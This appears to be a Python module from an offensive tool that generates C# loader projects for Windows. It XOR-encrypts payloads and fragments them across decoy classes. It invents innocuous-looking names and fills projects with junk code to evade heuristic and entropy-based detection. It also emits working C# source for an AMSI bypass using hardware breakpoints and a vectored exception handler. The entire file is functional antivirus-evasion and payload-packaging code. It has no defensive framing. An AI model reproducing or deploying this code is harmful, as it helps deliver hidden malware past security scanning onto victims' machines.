"""Shared loader utilities for .NET C# project generation passes.

Extracted from embed.py to be reused by LOLBAS, CLM bypass, and inject passes.
"""

from __future__ import annotations

import base64
import os
import secrets
import shutil
import subprocess
from pathlib import Path

# ── Heuristic-bypass naming ─────────────────────────────────────────────

_VERBS = [
    "Get", "Set", "Create", "Update", "Delete", "Process", "Handle",
    "Parse", "Format", "Validate", "Transform", "Convert", "Load",
    "Save", "Read", "Write", "Open", "Close", "Init", "Reset",
    "Build", "Resolve", "Execute", "Dispatch", "Register", "Configure",
]

_NOUNS = [
    "Service", "Config", "Data", "Context", "Manager", "Factory",
    "Handler", "Provider", "Repository", "Controller", "Adapter",
    "Processor", "Validator", "Formatter", "Converter", "Builder",
    "Resolver", "Dispatcher", "Registry", "Cache", "Buffer",
    "Channel", "Pipeline", "Session", "Token", "Descriptor",
]

_FIELD_PREFIXES = [
    "current", "default", "cached", "internal", "primary",
    "active", "pending", "last", "next", "base",
]

_TYPES_FOR_JUNK = [
    "int", "string", "bool", "double", "long", "float",
]


def plausible_name() -> str:
    """Generate a plausible-looking identifier like 'GetServiceHandler'."""
    return secrets.choice(_VERBS) + secrets.choice(_NOUNS)


def plausible_class() -> str:
    """Generate a plausible class name like 'ServiceManager'."""
    return secrets.choice(_NOUNS) + secrets.choice(_NOUNS)


def plausible_field() -> str:
    """Generate a plausible field name like 'currentBuffer'."""
    return secrets.choice(_FIELD_PREFIXES) + secrets.choice(_NOUNS)


# ── Payload encryption + fragmentation ──────────────────────────────────

_CHUNK_SIZE = 8192


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating key."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def fragment_payload(payload_b64: str, chunk_size: int = _CHUNK_SIZE) -> list[str]:
    """Split Base64 payload into chunks."""
    return [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]


def encrypt_and_encode(data: bytes) -> tuple[str, str]:
    """XOR-encrypt data with random key, return (payload_b64, key_b64)."""
    key = os.urandom(32)
    encrypted = xor_encrypt(data, key)
    return base64.b64encode(encrypted).decode("ascii"), base64.b64encode(key).decode("ascii")


# ── Junk code generation ────────────────────────────────────────────────

def generate_junk_class(used_names: set[str] | None = None) -> str:
    """Generate a fake class with plausible methods and string constants."""
    cls = plausible_class()
    if used_names is not None:
        counter = 0
        while cls in used_names:
            cls = plausible_class() + str(counter)
            counter += 1
        used_names.add(cls)
    lines = [f"internal sealed class {cls}", "{"]

    used_fields: set[str] = set()
    for _ in range(secrets.randbelow(3) + 3):
        t = secrets.choice(_TYPES_FOR_JUNK)
        name = plausible_field()
        while name in used_fields:
            name = plausible_field() + str(len(used_fields))
        used_fields.add(name)
        if t == "string":
            val = secrets.choice([
                "The quick brown fox jumps over the lazy dog",
                "Lorem ipsum dolor sit amet consectetur adipiscing elit",
                "Configuration loaded successfully from default path",
                "Initializing service pipeline with default parameters",
                "Processing batch operation completed without errors",
                "Application settings have been validated and applied",
                "The system has been configured for optimal performance",
                "Data transformation pipeline initialized successfully",
            ])
            lines.append(f'    private static readonly {t} {name} = "{val}";')
        elif t == "bool":
            lines.append(f"    private static readonly {t} {name} = false;")
        elif t == "int":
            lines.append(
                f"    private static readonly {t} {name} = {secrets.randbelow(10000)};"
            )
        elif t == "double":
            lines.append(
                f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0;"
            )
        elif t == "long":
            lines.append(
                f"    private static readonly {t} {name} = {secrets.randbelow(100000)}L;"
            )
        else:
            lines.append(
                f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0f;"
            )

    used_methods: set[str] = set()
    for _ in range(secrets.randbelow(2) + 2):
        method = plausible_name()
        while method in used_methods:
            method = plausible_name() + str(len(used_methods))
        used_methods.add(method)
        ret = secrets.choice(["void", "bool", "int", "string"])
        lines.append(f"    internal static {ret} {method}()")
        lines.append("    {")
        if ret == "void":
            lines.append(f'        Console.WriteLine("{plausible_name()}");')
        elif ret == "bool":
            lines.append("        return true;")
        elif ret == "int":
            lines.append(f"        return {secrets.randbelow(256)};")
        else:
            lines.append(f'        return "{plausible_name()}";')
        lines.append("    }")

    lines.append("}")
    return "\n".join(lines)


# ── HWBP+VEH AMSI bypass ───────────────────────────────────────────────

def hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str:
    """Generate C# source for patchless AMSI bypass via HWBP+VEH."""
    vis = "public" if public else "internal"
    addr_field = plausible_field()
    handler_field = plausible_field()
    return (
        "using System;\n"
        "using System.Runtime.InteropServices;\n\n"
        f"{vis} static class {cls_name}\n"
        "{{\n"
        f"    private static IntPtr {addr_field} = IntPtr.Zero;\n\n"
        "    private delegate int VehDelegate(IntPtr info);\n"
        f"    private static readonly VehDelegate {handler_field} = VehCallback;\n\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    private struct EXCEPTION_RECORD\n"
        "    {{\n"
        "        public uint ExceptionCode;\n"
        "        public uint ExceptionFlags;\n"
        "        public IntPtr ExceptionRecord;\n"
        "        public IntPtr ExceptionAddress;\n"
        "        public uint NumberParameters;\n"
        "    }}\n\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    private struct EXCEPTION_POINTERS\n"
        "    {{\n"
        "        public IntPtr ExceptionRecord;\n"
        "        public IntPtr ContextRecord;\n"
        "    }}\n\n"
        f"    {vis} static void {method_name}()\n"
        "    {{\n"
        "        try\n"
        "        {{\n"
        '            var lib = LoadLibrary("am" + "si.d" + "ll");\n'
        "            if (lib != IntPtr.Zero)\n"
        "            {{\n"
        '                {addr_field} = GetProcAddress(lib, "Amsi" + "Scan" + "Buffer");\n'
        f"                if ({addr_field} != IntPtr.Zero)\n"
        "                {{\n"
        f"                    AddVectoredExceptionHandler(1, {handler_field});\n"
        f"                    SetHwBp({addr_field});\n"
        "                }}\n"
        "            }}\n"
        "        }}\n"
        "        catch {{ }}\n"
        "    }}\n\n"
        "    private static int VehCallback(IntPtr infoPtr)\n"
        "    {{\n"
        "        var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(infoPtr);\n"
        "        var rec = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);\n\n"
        "        if (rec.ExceptionCode != 0x80000004)\n"
        "            return 0;\n\n"
        f"        if (rec.ExceptionAddress != {addr_field})\n"
        "            return 0;\n\n"
        "        var rsp = Marshal.ReadIntPtr(ep.ContextRecord, 0x98);\n"
        "        var retAddr = Marshal.ReadIntPtr(rsp);\n"
        "        var amsiResultPtr = Marshal.ReadIntPtr(rsp + 0x28);\n\n"
        "        if (amsiResultPtr != IntPtr.Zero)\n"
        "            Marshal.WriteInt32(amsiResultPtr, 0);\n\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0xF8, retAddr);\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x98, rsp + 8);\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x78, IntPtr.Zero);\n\n"
        "        return -1;\n"
        "    }}\n\n"
        "    private static void SetHwBp(IntPtr addr)\n"
        "    {{\n"
        "        var tid = GetCurrentThreadId();\n"
        "        var th = OpenThread(0x001A, false, tid);\n"
        "        if (th == IntPtr.Zero) return;\n\n"
        "        var ctx = Marshal.AllocHGlobal(1232);\n"
        "        try\n"
        "        {{\n"
        "            for (int i = 0; i < 1232; i++)\n"
        "                Marshal.WriteByte(ctx, i, 0);\n\n"
        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
        "            GetThreadContext(th, ctx);\n\n"
        "            Marshal.WriteIntPtr(ctx, 0x350, addr);\n"
        "            var dr7 = (long)Marshal.ReadIntPtr(ctx, 0x370);\n"
        "            Marshal.WriteIntPtr(ctx, 0x370, new IntPtr(dr7 | 0x1));\n\n"
        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
        "            SetThreadContext(th, ctx);\n"
        "        }}\n"
        "        finally\n"
        "        {{\n"
        "            Marshal.FreeHGlobal(ctx);\n"
        "            CloseHandle(th);\n"
        "        }}\n"
        "    }}\n\n"
        "    // ── P/Invoke ───────────────────────────────────────────\n\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr LoadLibrary(string n);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr AddVectoredExceptionHandler(\n"
        "        uint first, VehDelegate handler);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern uint GetCurrentThreadId();\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr OpenThread(uint access, bool inherit, uint tid);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool GetThreadContext(IntPtr hThread, IntPtr ctx);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool SetThreadContext(IntPtr hThread, IntPtr ctx);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool CloseHandle(IntPtr h);\n"
        "}}\n"
    ).format(addr_field=addr_field)


# ── C# project compilation ──────────────────────────────────────────────

def compile_dotnet_project(project_dir: Path, framework: str = "net472") -> bytes:
    """Compile a .NET project and return the output binary bytes.

    For net472: returns .exe
    For net8.0: returns .dll
    """
    if not shutil.which("dotnet"):
        raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")

    out_dir = project_dir / "out"
    result = subprocess.run(
        ["dotnet", "publish", str(project_dir),
         "-c", "Release", "-o", str(out_dir), "--nologo"],
        capture_output=True,
    )

    if result.returncode != 0:
        stderr = result.stderr.decode("utf-8", errors="replace")
        stdout = result.stdout.decode("utf-8", errors="replace")
        raise RuntimeError(f"Build failed:\n{stderr}\n{stdout}")

    # Find the output file
    for ext in (".exe", ".dll"):
        candidates = list(out_dir.glob(f"*{ext}"))
        # Prefer the project-named output
        for c in candidates:
            if c.stem != "System" and not c.stem.startswith("Microsoft."):
                return c.read_bytes()

    files = [f.name for f in out_dir.iterdir()] if out_dir.exists() else []
    raise RuntimeError(f"Build output not found. Files: {files}")


def write_fragment_files(
    project_dir: Path,
    chunks: list[str],
    used_class_names: set[str],
) -> list[str]:
    """Write fragment holder classes and return list of 'ClassName.FieldName' references."""
    fragment_refs: list[str] = []

    for i, chunk in enumerate(chunks):
        cls_name = plausible_class()
        while cls_name in used_class_names:
            cls_name = plausible_class() + str(i)
        used_class_names.add(cls_name)
        field_name = plausible_field()

        (project_dir / f"Fragment{i}.cs").write_text(
            "using System;\n\n"
            f"internal static class {cls_name}\n{{\n"
            f"    internal static readonly string {field_name} =\n"
            f'        "{chunk}";\n'
            f"}}\n"
        )
        fragment_refs.append(f"{cls_name}.{field_name}")

    return fragment_refs


def write_junk_files(
    project_dir: Path,
    count: int,
    used_class_names: set[str],
) -> None:
    """Write junk class files for entropy reduction."""
    for i in range(count):
        junk_src = generate_junk_class(used_class_names)
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )


def generate_standard_project_files(
    project_dir: Path,
    payload_b64: str,
    key_b64: str,
    used_class_names: set[str],
    *,
    amsi: bool = True,
    junk_count: int | None = None,
) -> tuple[str, str, str, list[str]]:
    """Generate standard supporting files for a C# loader project.

    Returns: (amsi_cls, amsi_method, reassemble_expr, fragment_refs)
    """
    # Fragments
    chunks = fragment_payload(payload_b64)
    fragment_refs = write_fragment_files(project_dir, chunks, used_class_names)

    if len(fragment_refs) == 1:
        reassemble_expr = fragment_refs[0]
    else:
        reassemble_expr = " + ".join(fragment_refs)

    # AMSI bypass
    amsi_cls = ""
    amsi_method = ""
    if amsi:
        amsi_cls = plausible_class()
        while amsi_cls in used_class_names:
            amsi_cls = plausible_class()
        used_class_names.add(amsi_cls)
        amsi_method = plausible_name()
        (project_dir / "AmsiBypass.cs").write_text(
            hwbp_veh_bypass_cs(amsi_cls, amsi_method, public=False)
        )

    # Junk classes
    jc = junk_count if junk_count is not None else secrets.randbelow(4) + 5
    write_junk_files(project_dir, jc, used_class_names)

    return amsi_cls, amsi_method, reassemble_expr, fragment_refs
